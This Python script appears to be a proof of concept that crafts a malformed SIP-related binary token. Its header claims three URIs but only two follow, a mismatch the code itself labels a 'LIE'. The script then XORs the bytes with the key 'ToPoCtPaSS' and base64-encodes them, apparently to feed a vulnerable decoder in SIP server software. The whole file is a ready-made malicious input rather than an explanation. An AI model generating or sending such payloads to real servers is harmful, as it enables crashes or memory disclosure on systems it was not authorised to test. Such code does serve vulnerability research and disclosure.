import base64

pw = b'ToPoCtPaSS'

# Header: flags(2) + uri_count(1)
# uri_count = 3, but the payload only contains a dual URI (= 2 real URIs)
raw = bytearray()
raw += b'\x00\x00'        # flags = 0x0000
raw += b'\x03'            # uri_count = 3  (LIE: only 2 URIs follow)

# --- URI1 (dual) ---
# props 0x4000 = IS_DUAL_URI | scheme sip | transport udp | domain ipv4
raw += b'\x40\x00'
raw += b'\x01\x02\x03\x04'  # IPv4 host 1.2.3.4, no port
# URI2 props byte: scheme sip(0), transport ws(0x20), no port, no r2
raw += b'\x20'

# --- socket --- flags: udp(0) | ipv4(0) | HAS_PORT(0x20)
raw += b'\x20'
raw += b'\x01\x02\x03\x04'  # socket IPv4 1.2.3.4
raw += b'\x13\xc4'          # port 5060

print('raw bytes  :', ' '.join('%02x' % b for b in raw))
print('uri_count  :', raw[2])

xored = bytes(raw[i] ^ pw[i % len(pw)] for i in range(len(raw)))
print('xored bytes:', ' '.join('%02x' % b for b in xored))
print('base64     :', base64.b64encode(xored).decode())
